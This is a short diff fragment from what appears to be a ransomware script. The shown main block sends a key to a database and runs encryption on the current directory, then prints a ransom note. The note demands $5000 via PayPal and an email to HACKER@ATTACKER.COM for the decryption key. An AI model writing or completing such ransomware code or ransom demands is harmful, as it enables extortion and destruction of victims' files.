@@ -98,5 +98,5 @@ if __name__ == "__main__":
     vid, key = sendKeyToDB()
     main(os.getcwd(), key)
     #testEncrypt(os.getcwd() + "/test.txt")
-    print("YOUR ID IS", vid)
+    print("\n\nYOUR ID IS", vid)
     print("PLEASE EMAIL HACKER@ATTACKER.COM WITH YOUR ID AND PAYPAL $5000 FOR KEY TO DECRYPT FILES\n\n")
